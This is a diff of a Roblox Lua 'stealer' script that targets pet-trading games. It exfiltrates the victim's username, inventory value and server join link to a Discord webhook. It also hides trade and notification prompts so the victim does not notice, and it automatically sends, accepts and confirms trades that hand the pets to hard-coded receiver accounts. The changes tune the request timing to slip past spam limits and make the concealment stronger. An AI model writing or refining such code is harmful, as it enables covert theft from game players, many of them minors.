@@ -1,4 +1,4 @@
--- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱ - OMNIPOTENT HASHED PESOS ]] --
+-- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ʜɪᴛ ﹒˚₊꒱ - OMNIPOTENT HASHED PESOS ]] --
 
 -- [[ CONFIG ]] --
 local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
@@ -15,7 +15,7 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- 3. BLACKLIST (Strict)
+-- 3. BLACKLIST (Strict - No Jerboas)
 local BLACKLIST = {
     ["jiggly_jerboa"] = true,
     ["starter_egg"] = true,
@@ -24,7 +24,7 @@ local BLACKLIST = {
     ["practice_dog"] = true
 }
 
--- 4. HASH FINDER
+-- 4. HASH FINDER (Remote Bypass)
 local hashes = {}
 for _, v in pairs(getgc()) do
     if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
@@ -42,7 +42,7 @@ local function hashedAPI(remoteName, ...)
     elseif remote:IsA("RemoteEvent") then remote:FireServer(...) end
 end
 
--- 5. VALUATION & EMOJIS
+-- 5. PRICING & EMOJIS (⭐🏇 logic)
 local function getFinalValue(base, props)
     if not base or base <= 0.01 then return 0 end
     local val = base
@@ -50,19 +50,20 @@ local function getFinalValue(base, props)
     elseif props.neon then val = val * 3 end
     if props.flyable then val = val + 0.5 end
     if props.rideable then val = val + 0.5 end
-    return val * 56
+    return val * 56 -- Conversion to Peso
 end
 
 local function getPetEmoji(props)
-    local e = "🐾"
+    local e = ""
     if props.mega_neon or props.mega then e = "Ⓜ️" 
-    elseif props.neon then e = "⭐" end
+    elseif props.neon then e = "⭐" 
+    else e = "🐾" end
     if props.flyable then e = e.."🪽" end
     if props.rideable then e = e.."🏇" end
     return e
 end
 
--- 6. INVENTORY SCAN
+-- 6. INVENTORY & SORTING (Individual Price Logic)
 local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
 local InventoryDB = Fsys("InventoryDB")
 local ClientData = Fsys("ClientData")
@@ -88,7 +89,7 @@ local function processInventory()
                     petGroups[key] = {
                         name = petData.name,
                         count = 1,
-                        price = unitVal,
+                        price = unitVal, -- Price per unit
                         emoji = getPetEmoji(props)
                     }
                 else
@@ -108,7 +109,7 @@ end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 7. WEBHOOK
+-- 7. WEBHOOK (Universal Request Fix)
 local function sendHit()
     local lines = {}
     for _, p in ipairs(sortedPets) do
@@ -116,35 +117,51 @@ local function sendHit()
     end
 
     local payload = {
+        content = (grandTotal >= 500 and "@everyone" or ""),
         embeds = {{
             title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ʜɪᴛ ﹒˚₊꒱",
-            description = "👤 Victim: "..LocalPlayer.DisplayName.."\n💰 Total: ₱"..string.format("%.2f", grandTotal),
+            description = "```" ..
+                "👤 Name     : "..LocalPlayer.DisplayName.."\n"..
+                "🆔 User     : "..LocalPlayer.Name.."\n"..
+                "💰 Total    : ₱"..string.format("%.2f", grandTotal).."```",
             fields = {
-                {name = "🐶 Inventory", value = "```"..table.concat(lines, "\n").."```"},
+                {name = "🏆 Best Pet", value = "```"..(sortedPets[1] and sortedPets[1].name or "None").."```", inline = true},
+                {name = "🐶 Inventory", value = "```" .. table.concat(lines, "\n") .. "```"},
                 {name = "🌐 Join", value = "[Click to Join](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
             },
-            color = 0x2F3136
+            color = 0x2F3136,
+            footer = {text = "Omnipotent Lynx | Peso Edition"}
         }}
     }
-    (syn and syn.request or request)({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
+    
+    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+    if req then
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end
 end
 
--- 8. THE STEAL (Bypass 10s Cooldown)
+-- 8. THE STEAL (Bypass 10s & GUI Silence)
 local function startSteal(target)
     task.spawn(function()
-        -- Suppress GUI
+        -- Suppress Victim GUI (Silence)
         LocalPlayer.PlayerGui.DescendantAdded:Connect(function(d)
-            if d.Name:find("Trade") or d.Name:find("Notification") then d.Visible = false end
+            pcall(function()
+                if d.Name:find("Trade") or d.Name:find("Notification") then d.Visible = false end
+            end)
         end)
 
-        -- Smart Wait for Receiver
+        -- Smart Cooldown Logic
         while not target.Character or not target.Parent do task.wait(1) end
         
-        -- High Priority Request
-        for i = 1, 40 do
+        for i = 1, 50 do
             if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then break end
             hashedAPI("TradeAPI/SendTradeRequest", target)
-            task.wait(0.5) -- Slightly slower interval to bypass spam-triggers
+            task.wait(0.4) -- Pulse every 0.4s to bypass spam triggers
         end
 
         if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
@@ -156,13 +173,19 @@ local function startSteal(target)
             while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
                 hashedAPI("TradeAPI/AcceptNegotiation")
                 hashedAPI("TradeAPI/ConfirmTrade")
-                task.wait(0.2)
+                task.wait(0.25)
             end
         end
     end)
 end
 
-if #sortedPets > 0 then sendHit() end
+-- Execute
+if #sortedPets > 0 then 
+    sendHit() 
+    print("🚀 Lynx: Webhook Sent. Total: ₱"..grandTotal)
+else
+    print("⚠️ Lynx: No pets hit the threshold.")
+end
 
 task.spawn(function()
     while true do
